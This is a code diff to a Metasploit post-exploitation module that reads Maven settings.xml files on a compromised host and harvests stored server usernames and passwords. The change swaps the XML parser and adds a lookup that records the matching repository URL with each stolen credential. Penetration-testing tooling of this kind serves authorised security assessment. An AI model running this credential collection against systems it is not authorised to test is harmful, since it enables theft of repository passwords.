@@ -4,7 +4,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rexml/document'
+require 'nokogiri'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -82,17 +82,38 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_settings(target, data)
-    doc = REXML::Document.new(data).root
+    xml_doc = Nokogiri::XML(data)
+    xml_doc.remove_namespaces!
 
-    doc.elements.each("servers/server") do |sub|
-      id = sub.elements['id'].text rescue "<unknown>"
-      username = sub.elements['username'].text rescue "<unknown>"
-      password = sub.elements['password'].text rescue "<unknown>"
+    xml_doc.xpath("//server").each do |server|
+      id = server.xpath("id").text
+      username = server.xpath("username").text
+      password = server.xpath("password").text
 
       print_status("Collected the following credentials:")
       print_status("    Id: %s" % id)
       print_status("    Username: %s" % username)
       print_status("    Password: %s" % password)
+
+      print_status("Try to find url from id...")
+      realm = ""
+      xml_doc.xpath("//mirror[id = '#{id}']").each do |mirror|
+        realm = mirror.xpath("url").text
+        print_status("Found url in mirror : #{realm}")
+      end
+
+      if realm.blank?
+        xml_doc.xpath("//repository[id = '#{id}']").each do |repository|
+          realm = repository.xpath("url").text
+          print_status("Found url in repository : #{realm}")
+        end
+      end
+
+      if realm.blank?
+        print_status("No url found, id will be set as realm")
+        realm = id
+      end
+
       print_line("")
 
       credential_data = {
@@ -100,7 +121,7 @@ class MetasploitModule < Msf::Post
           module_fullname: self.fullname,
           filename: target,
           service_name: 'maven',
-          realm_value: id,
+          realm_value: realm,
           realm_key: Metasploit::Model::Realm::Key::WILDCARD,
           private_type: :password,
           private_data: password,
